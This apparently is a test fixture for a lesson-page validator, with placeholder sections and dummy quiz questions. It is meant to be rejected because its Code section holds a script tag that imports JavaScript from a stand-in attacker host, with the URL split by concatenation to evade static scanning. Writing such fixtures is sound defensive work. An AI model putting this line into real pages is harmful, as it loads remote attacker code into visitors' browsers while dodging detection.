# Background

Rejection class: RUNTIME_EXTERNAL_REQUEST. The Code section builds an external
URL at runtime by string concatenation, so a static URL scan sees no contiguous
`https://` literal — but the dynamic `import(` call is flagged on its own.

# Intuition

Text.

# Code

<script>import("htt" + "ps://evil.example/x.js")</script>

# Quiz

{% quiz questions=[{question: "Q1?", options: ["a", "b"], answer: 0, feedback: ["no", "yes"]}, {question: "Q2?", options: ["a", "b"], answer: 1, feedback: ["no", "yes"]}, {question: "Q3?", options: ["a", "b"], answer: 0, feedback: ["no", "yes"]}, {question: "Q4?", options: ["a", "b"], answer: 1, feedback: ["no", "yes"]}, {question: "Q5?", options: ["a", "b"], answer: 0, feedback: ["no", "yes"]}] /%}
